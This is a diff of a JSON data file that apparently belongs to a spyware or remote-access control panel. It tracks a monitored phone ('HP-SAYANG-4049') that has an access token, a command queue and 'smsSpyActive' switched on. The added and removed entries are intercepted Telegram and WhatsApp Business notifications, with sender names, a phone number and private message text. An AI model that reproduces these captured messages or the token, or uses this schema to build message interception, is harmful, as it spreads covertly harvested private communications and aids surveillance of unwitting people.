@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775633957029,
+    "lastSeen": 1775633960025,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "13 new messages from 12 chats",
+        "time": "08/04 14:39",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775633960887
+      },
+      {
+        "appName": "Telegram",
+        "sender": "STORE Reski",
+        "content": "JDI? BELIK YANG MN?",
+        "time": "08/04 14:39",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775633958317
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗥𝗢𝗖𝗞𝗬 𝗧𝗘𝗔𝗠 🚩",
+        "content": "Voice message",
+        "time": "08/04 14:39",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775633958269
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ALL BUYYER GOJO HARIAN: ABIE super sus",
+        "content": "pgn deh",
+        "time": "08/04 14:39",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775633958255
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "16 new messages from 13 chats",
+        "time": "08/04 14:39",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775633958123
+      },
       {
         "appName": "Telegram",
         "sender": "STORE Reski",
@@ -4286,46 +4326,6 @@
         "time": "08/04 14:24",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775633061697
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 856-2460-4911",
-        "content": "📡 Undangan admin saluran",
-        "time": "08/04 14:24",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633061675
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WA Business",
-        "content": "‎‎15 pesan dari 4 chat",
-        "time": "08/04 14:24",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633060083
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 856-2460-4911",
-        "content": "Permisi Azx",
-        "time": "08/04 14:24",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633059922
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 856-2460-4911",
-        "content": "📡 Undangan admin saluran",
-        "time": "08/04 14:24",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633059494
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WA Business",
-        "content": "‎‎14 pesan dari 4 chat",
-        "time": "08/04 14:24",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633059478
       }
     ],
     "galleryPhotos": [],
